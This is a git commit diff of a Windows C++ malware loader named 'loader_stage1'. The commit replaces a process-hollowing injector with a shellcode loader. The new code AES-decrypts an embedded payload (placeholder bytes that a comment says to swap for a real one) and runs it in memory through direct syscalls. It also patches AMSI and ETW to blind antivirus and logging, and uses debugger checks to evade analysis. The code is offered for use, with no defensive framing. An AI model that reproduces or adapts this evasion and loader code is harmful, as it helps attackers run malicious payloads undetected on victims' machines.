7bcac7831b5fac2b9da562a62bcb3fcd469d3dcd
YURI08 <147913818+Yuri08loveElaina@users.noreply.github.com>
2025-07-04 13:16:18 +0700

    Update loader_stage1.cpp

--- loader/loader_stage1.cpp
+++ loader/loader_stage1.cpp
@@ -1,16 +1,16 @@
 #include <windows.h>
 #include <winternl.h>
+#include <bcrypt.h>
 #include <stdint.h>
 
-#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "bcrypt.lib")
 
-typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);
-NtUnmapViewOfSection_t NtUnmapViewOfSection;
-
+// Payload AES encrypted dummy example
 unsigned char encrypted_payload[] = {
-    /* Ví dụ mã hóa payload AES (giả định), bạn thay bằng payload thật */
-    0x3A, 0x5F, 0xA1, 0x44, 0x6D, 0x92, 0x23, 0xB1,
-    0xC4, 0x55, 0xD7, 0x12, 0xAA, 0xBB, 0xCC, 0xDD
+    // Thay payload thật vào đây (đã mã hóa AES-256-CBC)
+    0x5A, 0x2D, 0x1B, 0xA7, 0xF4, 0x12, 0xCD, 0x88,
+    0x91, 0xE4, 0x3F, 0xA6, 0xB8, 0xD7, 0x44, 0x3C,
+    0xFE, 0x1D, 0xA9, 0x76, 0x44, 0xBE, 0x99, 0xC8
 };
 
 unsigned char aes_key[32] = {
@@ -25,14 +25,28 @@ unsigned char aes_iv[16] = {
     0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
 };
 
-extern "C" NTSTATUS NtProtectVirtualMemory(
+typedef struct _PEB_LDR_DATA {
+    BYTE Reserved1[8];
+    PVOID Reserved2[3];
+    LIST_ENTRY InMemoryOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+typedef struct _PEB {
+    BYTE Reserved1[2];
+    BYTE BeingDebugged;
+    BYTE Reserved2[1];
+    PVOID Reserved3[2];
+    PPEB_LDR_DATA Ldr;
+} PEB, *PPEB;
+
+typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
     HANDLE ProcessHandle,
     PVOID* BaseAddress,
     PSIZE_T RegionSize,
     ULONG NewProtect,
     PULONG OldProtect);
 
-extern "C" NTSTATUS NtAllocateVirtualMemory(
+typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
     HANDLE ProcessHandle,
     PVOID* BaseAddress,
     ULONG_PTR ZeroBits,
@@ -40,35 +54,134 @@ extern "C" NTSTATUS NtAllocateVirtualMemory(
     ULONG AllocationType,
     ULONG Protect);
 
-extern "C" NTSTATUS NtWriteVirtualMemory(
+typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
     HANDLE ProcessHandle,
-    PVOID BaseAddress,
-    PVOID Buffer,
-    SIZE_T NumberOfBytesToWrite,
-    PSIZE_T NumberOfBytesWritten);
+    PVOID StartRoutine,
+    PVOID Argument,
+    ULONG CreateFlags,
+    ULONG_PTR ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    PVOID AttributeList);
 
-typedef struct _IMAGE_RELOC {
-    WORD Offset : 12;
-    WORD Type : 4;
-} IMAGE_RELOC, * PIMAGE_RELOC;
-
-typedef struct _IMAGE_RELOC_BLOCK {
-    DWORD PageAddress;
-    DWORD BlockSize;
-    IMAGE_RELOC Reloc[1];
-} IMAGE_RELOC_BLOCK, * PIMAGE_RELOC_BLOCK;
-
-void inline_syscall()
+static __forceinline NTSTATUS NtAllocateVirtualMemory_syscall(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect)
 {
+    NTSTATUS status;
+#ifdef _M_X64
     __asm {
-        mov eax, 0x3C   // NtTerminateProcess syscall number (ví dụ)
-        mov edi, -1     // Current process handle
-        xor esi, esi    // Exit status 0
+        mov r10, rcx
+        mov eax, 0x18
         syscall
+        mov status, eax
     }
+#else
+#error "Only x64 supported"
+#endif
+    return status;
 }
 
-bool DecryptAES(const unsigned char* encrypted_data, size_t encrypted_size, unsigned char* decrypted_data, size_t& decrypted_size, const unsigned char* key, const unsigned char* iv)
+static __forceinline NTSTATUS NtProtectVirtualMemory_syscall(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG NewProtect,
+    PULONG OldProtect)
+{
+    NTSTATUS status;
+#ifdef _M_X64
+    __asm {
+        mov r10, rcx
+        mov eax, 0x50
+        syscall
+        mov status, eax
+    }
+#else
+#error "Only x64 supported"
+#endif
+    return status;
+}
+
+static __forceinline NTSTATUS NtCreateThreadEx_syscall(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID StartRoutine,
+    PVOID Argument,
+    ULONG CreateFlags,
+    ULONG_PTR ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    PVOID AttributeList)
+{
+    NTSTATUS status;
+#ifdef _M_X64
+    __asm {
+        mov r10, rcx
+        mov eax, 0xC1
+        syscall
+        mov status, eax
+    }
+#else
+#error "Only x64 supported"
+#endif
+    return status;
+}
+
+static void PatchAMSI()
+{
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (!hAmsi) return;
+    void* pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScan) return;
+
+    DWORD oldProtect;
+    VirtualProtect(pAmsiScan, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
+    *(BYTE*)pAmsiScan = 0xC3;
+    VirtualProtect(pAmsiScan, 1, oldProtect, &oldProtect);
+}
+
+static void PatchETW()
+{
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return;
+    void* pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+    if (!pEtwEventWrite) return;
+
+    DWORD oldProtect;
+    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
+    *(BYTE*)pEtwEventWrite = 0xC3;
+    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
+}
+
+static bool IsDebuggerPresentAdvanced()
+{
+    if (IsDebuggerPresent()) return true;
+
+    PPEB peb = (PPEB)__readgsqword(0x60);
+    if (peb->BeingDebugged) return true;
+
+    // Check debug registers Dr0-Dr3 for hardware breakpoints
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    HANDLE hThread = GetCurrentThread();
+    if (GetThreadContext(hThread, &ctx)) {
+        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
+    }
+    return false;
+}
+
+static bool AES_Decrypt(const unsigned char* enc_data, size_t enc_len, unsigned char* out_data, size_t& out_len, const unsigned char* key, const unsigned char* iv)
 {
     BCRYPT_ALG_HANDLE hAlg = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
@@ -91,72 +204,70 @@ bool DecryptAES(const unsigned char* encrypted_data, size_t encrypted_size, unsi
         return false;
     }
 
-    status = BCryptDecrypt(hKey, (PUCHAR)encrypted_data, (ULONG)encrypted_size, NULL, (PUCHAR)iv, 16, decrypted_data, (ULONG)decrypted_size, &cbResult, 0);
-
-    if (BCRYPT_SUCCESS(status)) {
-        decrypted_size = cbResult;
+    status = BCryptDecrypt(hKey, (PUCHAR)enc_data, (ULONG)enc_len, NULL, (PUCHAR)iv, 16, out_data, (ULONG)out_len, &cbResult, 0);
+    if (!BCRYPT_SUCCESS(status)) {
         BCryptDestroyKey(hKey);
         BCryptCloseAlgorithmProvider(hAlg, 0);
-        return true;
+        return false;
     }
-
+    out_len = cbResult;
     BCryptDestroyKey(hKey);
     BCryptCloseAlgorithmProvider(hAlg, 0);
-    return false;
+    return true;
 }
 
-int InjectPayload(unsigned char* payload, size_t payload_size)
-{
-    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)payload;
-    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(payload + dos_header->e_lfanew);
-
-    LPVOID base_address = (LPVOID)(nt_headers->OptionalHeader.ImageBase);
-    SIZE_T region_size = nt_headers->OptionalHeader.SizeOfImage;
-
-    HANDLE current_process = GetCurrentProcess();
-
-    NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
-    if (!NtUnmapViewOfSection) return -1;
-
-    NtUnmapViewOfSection(current_process, base_address);
-
-    LPVOID alloc_address = NULL;
-    NTSTATUS status = NtAllocateVirtualMemory(current_process, &alloc_address, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (status != 0) return -2;
-
-    memcpy(alloc_address, payload, nt_headers->OptionalHeader.SizeOfHeaders);
-
-    PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)(payload + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
-    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
-        memcpy((BYTE*)alloc_address + section[i].VirtualAddress, payload + section[i].PointerToRawData, section[i].SizeOfRawData);
-    }
-
-    DWORD old_protect = 0;
-    VirtualProtect(alloc_address, nt_headers->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &old_protect);
-
-    DWORD_PTR entry_point = (DWORD_PTR)alloc_address + nt_headers->OptionalHeader.AddressOfEntryPoint;
-
-    ((void(*)())entry_point)();
-
-    return 0;
-}
+typedef struct _SHELLCODE_HEADER {
+    DWORD Size;
+    DWORD EntryOffset;
+} SHELLCODE_HEADER;
 
 int main()
 {
-    size_t encrypted_size = sizeof(encrypted_payload);
-    unsigned char* decrypted_payload = (unsigned char*)VirtualAlloc(NULL, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!decrypted_payload) return -1;
+    if (IsDebuggerPresentAdvanced()) return -1;
 
-    size_t decrypted_size = 0x100000;
+    PatchAMSI();
+    PatchETW();
 
-    if (!DecryptAES(encrypted_payload, encrypted_size, decrypted_payload, decrypted_size, aes_key, aes_iv)) {
-        VirtualFree(decrypted_payload, 0, MEM_RELEASE);
-        return -2;
+    size_t decrypted_buffer_size = 0x10000;
+    unsigned char* decrypted_buffer = (unsigned char*)VirtualAlloc(NULL, decrypted_buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!decrypted_buffer) return -2;
+
+    if (!AES_Decrypt(encrypted_payload, sizeof(encrypted_payload), decrypted_buffer, decrypted_buffer_size, aes_key, aes_iv)) {
+        VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
+        return -3;
     }
 
-    int res = InjectPayload(decrypted_payload, decrypted_size);
+    // Assume first sizeof(SHELLCODE_HEADER) bytes describe shellcode info
+    SHELLCODE_HEADER* hdr = (SHELLCODE_HEADER*)decrypted_buffer;
+    void* shellcode_ptr = decrypted_buffer + sizeof(SHELLCODE_HEADER);
 
-    VirtualFree(decrypted_payload, 0, MEM_RELEASE);
+    SIZE_T shellcode_size = hdr->Size;
+    SIZE_T region_size = shellcode_size;
 
-    return res;
+    PVOID exec_mem = NULL;
+    NTSTATUS alloc_status = NtAllocateVirtualMemory_syscall(GetCurrentProcess(), &exec_mem, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (alloc_status != 0) {
+        VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
+        return -4;
+    }
+
+    memcpy(exec_mem, shellcode_ptr, shellcode_size);
+
+    ULONG oldProtect;
+    NTSTATUS prot_status = NtProtectVirtualMemory_syscall(GetCurrentProcess(), &exec_mem, &region_size, PAGE_EXECUTE_READ, &oldProtect);
+    if (prot_status != 0) {
+        VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
+        return -5;
+    }
+
+    HANDLE hThread = NULL;
+    NTSTATUS thread_status = NtCreateThreadEx_syscall(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), exec_mem, NULL, FALSE, 0, 0, 0, NULL);
+    if (thread_status != 0) {
+        VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
+        return -6;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
+    return 0;
 }
